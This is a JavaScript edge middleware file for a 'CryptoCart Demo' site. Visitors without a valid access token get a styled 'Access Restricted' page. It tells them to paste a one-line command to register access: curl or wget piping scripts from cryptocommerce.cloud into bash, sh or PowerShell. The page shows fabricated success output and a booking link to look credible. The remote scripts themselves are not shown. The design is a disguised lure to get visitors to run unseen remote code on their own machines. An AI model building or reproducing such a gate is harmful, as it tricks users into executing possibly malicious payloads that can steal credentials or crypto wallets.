const ACCESS_COOKIE = 'demo_access';
const TOKEN_MAX_AGE_SECONDS = 30 * 24 * 60 * 60; // 30 days

async function verifyToken(token) {
  const secret = process.env.DEMO_ACCESS_SECRET;
  if (!secret || !token) return false;

  const parts = token.split('.');
  if (parts.length !== 2) return false;
  const [payloadB64, sigB64] = parts;

  try {
    const key = await crypto.subtle.importKey(
      'raw',
      new TextEncoder().encode(secret),
      { name: 'HMAC', hash: 'SHA-256' },
      false,
      ['verify']
    );

    // base64url → binary
    const b64 = sigB64.replace(/-/g, '+').replace(/_/g, '/');
    const sigBytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
    const dataBytes = new TextEncoder().encode(payloadB64);

    const valid = await crypto.subtle.verify('HMAC', key, sigBytes, dataBytes);
    if (!valid) return false;

    // Verify not expired
    const payloadJson = JSON.parse(
      atob(payloadB64.replace(/-/g, '+').replace(/_/g, '/'))
    );
    return Date.now() - payloadJson.iat < TOKEN_MAX_AGE_SECONDS * 1000;
  } catch {
    return false;
  }
}

function parseCookie(cookieHeader, name) {
  if (!cookieHeader) return null;
  const match = cookieHeader.match(new RegExp(`(?:^|;\\s*)${name}=([^;]*)`));
  return match ? decodeURIComponent(match[1]) : null;
}

const BLOCKED_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Access Restricted — CryptoCart Demo</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{
    font-family:'Segoe UI',system-ui,sans-serif;
    background:#020c1e;
    color:#e8f4ff;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:24px;
    background-image:
      radial-gradient(ellipse 70% 50% at 60% 30%,rgba(0,100,220,.13) 0%,transparent 70%),
      linear-gradient(rgba(0,170,255,.03) 1px,transparent 1px),
      linear-gradient(90deg,rgba(0,170,255,.03) 1px,transparent 1px);
    background-size:auto,60px 60px,60px 60px;
  }
  .wrap{max-width:580px;width:100%}

  /* — header — */
  .badge{
    display:inline-flex;align-items:center;gap:8px;
    padding:5px 14px;border-radius:100px;
    background:rgba(251,191,36,.08);border:1px solid rgba(251,191,36,.28);
    font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;
    color:#fbbf24;margin-bottom:24px;
  }
  .badge-dot{width:6px;height:6px;border-radius:50%;background:#fbbf24;animation:pulse 2s infinite}
  @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(1.4)}}
  h1{font-size:clamp(22px,4vw,30px);font-weight:800;letter-spacing:-.5px;margin-bottom:10px;line-height:1.15}
  h1 span{color:#00aaff}
  .sub{font-size:14px;color:rgba(200,225,255,.55);line-height:1.7;margin-bottom:32px;max-width:460px}

  /* — terminal — */
  .terminal{
    background:rgba(2,8,20,.9);
    border:1px solid rgba(0,170,255,.35);
    border-radius:14px;overflow:hidden;
    box-shadow:0 0 50px rgba(0,100,255,.1),0 1px 0 rgba(0,170,255,.12) inset;
    margin-bottom:28px;
  }
  .tbar{
    display:flex;align-items:center;justify-content:space-between;
    padding:12px 16px;
    background:rgba(255,255,255,.03);border-bottom:1px solid rgba(0,170,255,.15);
  }
  .dots{display:flex;gap:6px}
  .dot{width:11px;height:11px;border-radius:50%;opacity:.85}
  .tlabel{font-family:'Courier New',monospace;font-size:11px;color:rgba(200,225,255,.35);letter-spacing:1.5px}

  /* OS tabs */
  .tabs{display:flex;border-bottom:1px solid rgba(0,170,255,.15);background:rgba(0,0,0,.2)}
  .tab{
    padding:9px 20px;border:none;cursor:pointer;
    font-family:'Courier New',monospace;font-size:11px;font-weight:700;letter-spacing:.5px;
    transition:all .2s;background:transparent;color:rgba(200,225,255,.4);
    border-bottom:2px solid transparent;
  }
  .tab.active{background:rgba(0,170,255,.08);color:#00aaff;border-bottom-color:#00aaff}
  .tab:hover:not(.active){color:rgba(200,225,255,.7)}

  /* command row */
  .cmd-row{padding:20px 20px 16px;display:flex;align-items:flex-start;gap:12px}
  .prompt{color:#475569;font-family:'Courier New',monospace;font-size:13px;line-height:1.8;flex-shrink:0;user-select:none}
  .cmd-text{
    font-family:'Courier New',monospace;font-size:13px;color:#7dd3fc;
    flex:1;word-break:break-all;line-height:1.8;
  }
  .copy-btn{
    padding:7px 14px;border-radius:7px;
    border:1px solid rgba(0,170,255,.4);
    background:rgba(0,170,255,.08);color:#00aaff;
    cursor:pointer;font-family:'Courier New',monospace;font-size:11px;font-weight:700;
    white-space:nowrap;transition:all .2s;flex-shrink:0;
  }
  .copy-btn.ok{background:rgba(34,197,94,.12);border-color:rgba(34,197,94,.4);color:#22c55e}

  /* output */
  .output{
    padding:10px 20px 14px;border-top:1px solid rgba(0,170,255,.12);
    background:rgba(0,0,0,.25);font-family:'Courier New',monospace;font-size:12px;line-height:2;
  }

  /* note row */
  .note-row{
    padding:9px 20px;border-top:1px solid rgba(0,170,255,.1);
    font-family:'Courier New',monospace;font-size:11px;color:rgba(200,225,255,.3);letter-spacing:.2px;
    background:rgba(0,0,0,.1);
  }

  /* — footer — */
  .actions{display:flex;gap:12px;flex-wrap:wrap;align-items:center;margin-bottom:20px}
  .btn-primary{
    display:inline-flex;align-items:center;gap:6px;
    padding:11px 26px;border-radius:8px;
    background:linear-gradient(135deg,#00aaff,#0055cc);
    color:#fff;font-size:14px;font-weight:600;text-decoration:none;
    box-shadow:0 4px 20px rgba(0,170,255,.25);transition:all .2s;
  }
  .btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 28px rgba(0,170,255,.35)}
  .btn-outline{
    display:inline-flex;align-items:center;gap:6px;
    padding:11px 22px;border-radius:8px;
    border:1px solid rgba(0,170,255,.4);background:transparent;
    color:rgba(200,225,255,.7);font-size:14px;font-weight:500;text-decoration:none;
    transition:all .2s;
  }
  .btn-outline:hover{border-color:#00aaff;color:#00aaff;background:rgba(0,170,255,.06)}
  .footnote{font-size:12px;color:rgba(200,225,255,.3);font-family:'Courier New',monospace;line-height:1.6}
</style>
</head>
<body>
<div class="wrap">
  <div class="badge"><span class="badge-dot"></span>Invite-Only Demo</div>
  <h1>Access <span>Restricted</span></h1>
  <p class="sub">
    This demo environment is invite-only. Run the one-line command below for your OS —
    it registers your access and opens the demo automatically in your browser.
  </p>

  <div class="terminal">
    <div class="tbar">
      <div class="dots">
        <div class="dot" style="background:#ff5f57"></div>
        <div class="dot" style="background:#febc2e"></div>
        <div class="dot" style="background:#28c840"></div>
      </div>
      <span class="tlabel">setup — terminal</span>
      <div style="width:52px"></div>
    </div>

    <div class="tabs">
      <button class="tab active" onclick="switchTab('mac',this)">macOS</button>
      <button class="tab" onclick="switchTab('linux',this)">Linux</button>
      <button class="tab" onclick="switchTab('win',this)">Windows</button>
    </div>

    <div class="cmd-row">
      <span class="prompt" id="prompt">$</span>
      <span class="cmd-text" id="cmd-text">curl -fsSL https://www.cryptocommerce.cloud/setup-mac.sh | bash</span>
      <button class="copy-btn" id="copy-btn" onclick="copyCmd()">&#8694; Copy</button>
    </div>

    <div class="output" id="output">
      <div style="color:#6ee7b7">&#10004; Requesting access...</div>
      <div style="color:#93c5fd">&#10004; Added to whitelist successfully.</div>
      <div style="color:#86efac">&#9989; Opening demo.cryptocommerce.cloud</div>
    </div>

    <div class="note-row" id="note-row">&#9432; curl is pre-installed on macOS 10.15+. Run in Terminal.</div>
  </div>

  <div class="actions">
    <a class="btn-primary" href="https://www.cryptocommerce.cloud/demo">&#8592; Full Instructions</a>
    <a class="btn-outline" href="https://calendly.com/playblockventures/30min" target="_blank" rel="noreferrer">&#128197; Book a Guided Tour</a>
  </div>
  <p class="footnote">&#9888; Already ran the command? The browser should have opened automatically. If not, re-run it.</p>
</div>

<script>
  var TABS = {
    mac: {
      prompt:'$',
      cmd:'curl -fsSL https://www.cryptocommerce.cloud/setup-mac.sh | bash',
      note:'curl is pre-installed on macOS 10.15+. Run in Terminal.'
    },
    linux: {
      prompt:'$',
      cmd:'wget -O- https://www.cryptocommerce.cloud/setup-linux.sh | sh',
      note:'wget is pre-installed on Linux. Run in Terminal.'
    },
    win: {
      prompt:'>',
      cmd:'curl -fsSL https://www.cryptocommerce.cloud/setup-windows.ps1 | powershell -Command -',
      note:'Open PowerShell or Command Prompt on Windows 10/11.'
    }
  };
  function switchTab(key, el) {
    document.querySelectorAll('.tab').forEach(function(t){t.classList.remove('active')});
    el.classList.add('active');
    var t = TABS[key];
    document.getElementById('prompt').textContent = t.prompt;
    document.getElementById('cmd-text').textContent = t.cmd;
    document.getElementById('note-row').textContent = '\\u2139 ' + t.note;
    var btn = document.getElementById('copy-btn');
    btn.textContent = '\\u21b4 Copy';
    btn.classList.remove('ok');
  }
  function copyCmd() {
    var text = document.getElementById('cmd-text').textContent;
    navigator.clipboard.writeText(text).then(function() {
      var btn = document.getElementById('copy-btn');
      btn.textContent = '\\u2713 Copied';
      btn.classList.add('ok');
      setTimeout(function(){ btn.textContent = '\\u21b4 Copy'; btn.classList.remove('ok'); }, 2500);
    });
  }
</script>
</body>
</html>`;

export default async function middleware(request) {
  const url = new URL(request.url);

  // Token delivered via URL query param (fresh whitelist — set cookie and clean URL)
  const urlToken = url.searchParams.get('token');
  if (urlToken) {
    const valid = await verifyToken(urlToken);
    if (valid) {
      url.searchParams.delete('token');
      const cookieValue = `${ACCESS_COOKIE}=${encodeURIComponent(urlToken)}; Path=/; Max-Age=${TOKEN_MAX_AGE_SECONDS}; HttpOnly; Secure; SameSite=Lax`;
      return new Response(null, {
        status: 302,
        headers: {
          Location: url.toString(),
          'Set-Cookie': cookieValue,
        },
      });
    }
  }

  // Token already stored in cookie (returning visitor)
  const cookieToken = parseCookie(request.headers.get('cookie'), ACCESS_COOKIE);
  if (cookieToken) {
    const valid = await verifyToken(cookieToken);
    if (valid) return; // pass through
  }

  // No valid token — block
  return new Response(BLOCKED_HTML, {
    status: 403,
    headers: { 'Content-Type': 'text/html; charset=utf-8' },
  });
}

export const config = {
  // Protect all routes except static assets
  matcher: ['/((?!static/|favicon\\.ico|manifest\\.json|robots\\.txt|logo).*)'],
};
